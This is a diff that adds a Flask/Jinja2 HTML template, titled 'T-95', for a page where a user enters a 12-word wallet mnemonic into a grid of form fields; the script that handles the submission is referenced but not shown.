@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-95</title>
+
+    <link rel="stylesheet" href="{{url_for('static', filename='css/style.css')}}">
+</head>
+
+<body>
+    <main>
+        <div class="module module-enlarged">
+			<a href="/" class="back-link">&#8592;</a>
+			<h2>Enter your 12-word Mnemonic</h2>
+			<form onsubmit="submitMnemonic(event)">
+				{{ form.hidden_tag() }}
+				<div class="mnemonic-grid">
+					<div class="form-field">{{ form.word1(class_="input-field", placeholder="Word 1", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word2(class_="input-field", placeholder="Word 2", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word3(class_="input-field", placeholder="Word 3", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word4(class_="input-field", placeholder="Word 4", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word5(class_="input-field", placeholder="Word 5", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word6(class_="input-field", placeholder="Word 6", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word7(class_="input-field", placeholder="Word 7", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word8(class_="input-field", placeholder="Word 8", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word9(class_="input-field", placeholder="Word 9", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word10(class_="input-field", placeholder="Word 10", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word11(class_="input-field", placeholder="Word 11", autocomplete="off", required=True) }}</div>
+					<div class="form-field">{{ form.word12(class_="input-field", placeholder="Word 12", autocomplete="off", required=True) }}</div>
+				</div>
+				<div class="form-field" style="margin-top: 10px;">
+					{{ form.submit(class_="centered-button") }}
+				</div>
+			</form>
+			<p class="status-msg"></p>
+		</div>
+    </main>
+	<script src="{{url_for('static', filename='js/index.js')}}"></script>
+</body>
+
+</html>
